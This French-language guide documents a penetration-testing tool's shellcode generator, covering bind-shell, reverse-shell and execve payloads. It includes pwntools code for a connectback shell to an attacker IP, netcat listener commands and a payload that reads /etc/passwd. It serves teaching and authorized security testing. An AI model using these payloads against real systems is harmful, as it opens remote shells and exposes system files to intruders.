# Guide d'utilisation de la fonctionnalité Shellcode

Ce guide explique comment utiliser efficacement la fonctionnalité avancée "Shellcode" du Pwn Tool Pro pour générer des exploits adaptés à différents scénarios de sécurité.

## Table des matières

1. [Introduction aux shellcodes](#introduction-aux-shellcodes)
2. [Options disponibles](#options-disponibles)
3. [Types de shellcode et cas d'utilisation](#types-de-shellcode-et-cas-dutilisation)
4. [Exemples pratiques](#exemples-pratiques)
5. [Personnalisation avancée](#personnalisation-avancée)

## Introduction aux shellcodes

Un **shellcode** est un petit morceau de code conçu pour être injecté dans un programme vulnérable, généralement pour exécuter des commandes arbitraires. Dans l'outil Pwn Tool Pro, vous pouvez générer différents types de shellcodes adaptés à vos besoins de test d'intrusion.

## Options disponibles

### Architecture

L'architecture définit le type de processeur ciblé par votre exploit:

- **amd64**: Processeurs 64 bits x86_64 (la plupart des ordinateurs modernes)
- **i386**: Processeurs 32 bits x86 (systèmes plus anciens)
- **arm**: Processeurs ARM 32 bits (certains appareils mobiles, IoT)
- **aarch64**: Processeurs ARM 64 bits (appareils mobiles modernes, Raspberry Pi récents)

Choisissez l'architecture qui correspond au système cible que vous testez.

### Types de Shellcode

- **shell_bind_tcp**: Ouvre un port d'écoute sur la cible et vous permet de vous y connecter
- **shell_reverse_tcp**: La cible se connecte à votre machine, vous donnant accès à un shell
- **execve**: Exécute une commande spécifique sur la cible (par défaut `/bin/sh`)

### Port personnalisé

Port réseau à utiliser pour les connexions (bind ou reverse). La valeur par défaut est 4444.

### Payloads prédéfinis

Une liste de modèles préconfigurés pour différents scénarios d'exploit.

## Types de shellcode et cas d'utilisation

### 1. Shell Bind TCP

**Cas d'utilisation**: Quand vous avez un accès direct au réseau de la cible et que vous pouvez vous connecter à n'importe quel port ouvert.

**Comment ça fonctionne**:
1. Le shellcode ouvre un port d'écoute sur la machine cible
2. Vous vous connectez à ce port depuis votre machine d'attaque
3. Vous obtenez un shell sur la machine cible

**Pour utiliser**:
1. Sélectionnez l'architecture de la cible (ex: amd64)
2. Choisissez `shell_bind_tcp`
3. Définissez un port accessible (ex: 4444)
4. Cliquez sur "⚡ Générer Exploit"
5. Une fois l'exploit exécuté sur la cible, connectez-vous avec: `nc <TARGET_IP> 4444`

### 2. Shell Reverse TCP

**Cas d'utilisation**: Quand la cible est derrière un NAT/firewall qui bloque les connexions entrantes.

**Comment ça fonctionne**:
1. Vous ouvrez un port d'écoute sur votre machine d'attaque
2. Le shellcode se connecte depuis la machine cible vers votre machine
3. Vous obtenez un shell sur la machine cible

**Pour utiliser**:
1. Ouvrez un port d'écoute sur votre machine: `nc -lvnp 4444`
2. Sélectionnez l'architecture de la cible (ex: amd64)
3. Choisissez `shell_reverse_tcp`
4. Définissez le port que vous avez ouvert (ex: 4444)
5. Assurez-vous que la cible est configurée pour se connecter à votre adresse IP
6. Cliquez sur "⚡ Générer Exploit"

### 3. Execve

**Cas d'utilisation**: Quand vous voulez exécuter une commande spécifique sans établir de connexion réseau.

**Comment ça fonctionne**:
1. Le shellcode exécute une commande système (par défaut `/bin/sh`)
2. Si vous avez déjà un accès interactif, cela peut vous donner un shell plus privilégié

**Pour utiliser**:
1. Sélectionnez l'architecture de la cible (ex: amd64) 
2. Choisissez `execve`
3. Cliquez sur "⚡ Générer Exploit"

## Exemples pratiques

### Exemple 1: Exploit pour une machine Linux distante

**Scénario**: Vous avez identifié une vulnérabilité de buffer overflow dans un service réseau sur un serveur Linux 64 bits.

**Configuration**:
- Architecture: amd64
- Type de Shellcode: shell_reverse_tcp
- Port personnalisé: 4444
- Payload prédéfini: "Linux x64 - Reverse Shell"

1. Modifiez le payload pour inclure votre IP:
```python
# 1. Lancez un listener sur votre machine
# nc -lvnp 4444
# 2. Remplacez ATTACKER_IP par votre IP (ex: 192.168.1.100)
shellcode = asm(shellcraft.amd64.linux.connectback('192.168.1.100', 4444))
```

2. Générez l'exploit et envoyez-le à la cible
3. Sur votre machine: `nc -lvnp 4444`
4. Une fois l'exploit exécuté sur la cible, vous recevrez une connexion shell

### Exemple 2: Test local d'une application vulnérable

**Scénario**: Vous testez une application locale 32 bits sous Linux avec une vulnérabilité connue.

**Configuration**:
- Architecture: i386
- Type de Shellcode: execve
- Payload prédéfini: "Linux x64 - Execute /bin/sh"

1. Modifiez le payload selon l'architecture:
```python
# Générez le shellcode pour i386
shellcode = asm(shellcraft.i386.linux.sh())
# Pour exécuter:
p = process('./application_vulnerable')
p.sendline(shellcode)
p.interactive()
```

2. Générez l'exploit et utilisez-le pour tester l'application

## Personnalisation avancée

Pour les utilisateurs avancés, le champ "Payload personnalisé" permet d'écrire du code Python personnalisé qui sera exécuté pour générer un shellcode sur mesure.

**Exemple: Shellcode encodé pour éviter les caractères nuls**:

```python
# Génération d'un shellcode sans caractères nuls
shellcode = asm(shellcraft.amd64.linux.sh())
encoded = ""
for b in shellcode:
    encoded += "\\x%02x" % b
print(f"Shellcode encodé: {encoded}")
```

**Exemple: Shellcode avec chaîne de commande personnalisée**:

```python
# Exécute une commande personnalisée
shellcode = asm(shellcraft.amd64.linux.system("cat /etc/passwd"))
```

## Conseils de sécurité

- Testez toujours vos exploits dans un environnement contrôlé et isolé
- Obtenez les autorisations appropriées avant de tester sur des systèmes en production
- N'utilisez ces outils que pour des tests de sécurité légitimes ou à des fins éducatives